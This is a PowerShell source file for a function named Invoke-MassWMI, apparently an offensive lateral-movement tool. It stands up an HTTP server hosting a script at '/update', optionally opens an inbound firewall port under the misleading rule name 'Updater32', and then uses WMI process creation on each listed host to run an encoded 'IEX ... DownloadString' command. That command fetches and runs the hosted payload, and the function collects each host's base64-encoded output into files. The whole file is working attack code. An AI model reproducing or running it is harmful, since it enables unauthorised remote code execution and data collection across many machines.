function Invoke-MassWMI {
    [cmdletbinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]] $Hosts,
        [String] $HostList,
        [String] $LocalIpAddress,
        [String] $LocalPort="8080",
        [Int] $ServerSleep=10,
        [String] $OutputFolder="SearchOutput",
        [Switch] $NoSYSWOW64,
        [Switch] $FireWallRule,
        [String] $Username,
        [String] $Password)
    begin {
        $WebserverScriptblock={
            param($LocalPort, $OutputFolder)
            $HostedScript = 
@'
REPLACE_HERE
'@
            $HostedScript += @'
; Start-Sleep -s 1000000
'@
            $Hso = New-Object Net.HttpListener
            $Hso.Prefixes.Add("http://+:$LocalPort/")
            $Hso.Start()
            while ($Hso.IsListening) {
                $HC = $Hso.GetContext()
                $OriginatingIP = $HC.Request.UserHostAddress
                $HRes = $HC.Response
                $HRes.Headers.Add("Content-Type","text/plain")
                $Buf = [Text.Encoding]::UTF8.GetBytes("")
                if( $HC.Request.RawUrl -eq "/update"){
                    $Buf = [Text.Encoding]::UTF8.GetBytes($HostedScript)
                }
                elseif( $HC.Request.RawUrl -eq "/"){
                    $Buf = [Text.Encoding]::UTF8.GetBytes("")
                }
                else {
                    $hostname = $HC.Request.RawUrl.split("/")[-1]
                    $output = ""
                    $size = $HC.Request.ContentLength64 + 1
                    $buffer = New-Object byte[] $size
                    do {
                        $count = $HC.Request.InputStream.Read($buffer, 0, $size)
                        $output += $HC.Request.ContentEncoding.GetString($buffer, 0, $count)
                    } until($count -lt $size)
                    $HC.Request.InputStream.Close()
                    if (($output) -and ($output.Length -ne 0)){
                        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output))
                        $OutFile = $OutputFolder + "\$($hostname).txt"
                        $decoded | Out-File -Append -Encoding ASCII -FilePath $OutFile
                    }
                }
                $HRes.ContentLength64 = $Buf.Length
                $HRes.OutputStream.Write($Buf,0,$Buf.Length)
                $HRes.Close()
            }
        }
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts += Get-Content -Path $HostList
            }
            else {
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
            }
        }
        if(-not ($OutputFolder.Contains("\"))){
            $OutputFolder = (Get-Location).Path + "\" + $OutputFolder
        }
        New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null
        if($FireWallRule){
            Write-Verbose "Setting inbound firewall rule for port $LocalPort"
            $fw = New-Object -ComObject hnetcfg.fwpolicy2
            $rule = New-Object -ComObject HNetCfg.FWRule
            $rule.Name = "Updater32"
            $rule.Protocol = 6
            $rule.LocalPorts = $LocalPort
            $rule.Direction = 1
            $rule.Enabled=$true
            $rule.Grouping="@firewallapi.dll,-23255"
            $rule.Profiles = 7
            $rule.Action=1
            $rule.EdgeTraversal=$false
            $fw.Rules.Add($rule)
        }
        Start-Job -Name WebServer -Scriptblock $WebserverScriptblock -ArgumentList $LocalPort,$OutputFolder | Out-Null
        Write-Verbose "Sleeping, letting the web server stand up..."
        Start-Sleep -s 5
    }
    process {
        if(-not $LocalIpAddress){
            $LocalIpAddress = (gwmi Win32_NetworkAdapterConfiguration | ? { $_.IPAddress -ne $null}).ipaddress[0]
        }
        $hosts | % {
            $command = "IEX (New-Object Net.Webclient).DownloadString('http://"+$LocalIpAddress+":$LocalPort/update')"
            $bytes = [Text.Encoding]::Unicode.GetBytes($command)
            $encodedCommand = [Convert]::ToBase64String($bytes)
            if ($NoSYSWOW64){
                Write-Verbose "Executing command on host `"$_`""
                Invoke-WmiMethod -ComputerName $_ -Path Win32_process -Name create -ArgumentList "powershell.exe -enc $encodedCommand" | out-null
            }
            else{
                Write-Verbose "Executing SYSwow64 command on host `"$_`""
                Invoke-WmiMethod -ComputerName $_ -Path Win32_process -Name create -ArgumentList "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -enc $encodedCommand" | out-null
            }
        }
    }
    end {
        Write-Verbose "Waiting $ServerSleep seconds for commands to trigger..."
        Start-Sleep -s $ServerSleep
        if($FireWallRule){
            Write-Verbose "Removing inbound firewall rule"
            $fw.rules.Remove("Updater32")
        }
        Write-Verbose "Killing the web server"
        Get-Job -Name WebServer | Stop-Job
    }
}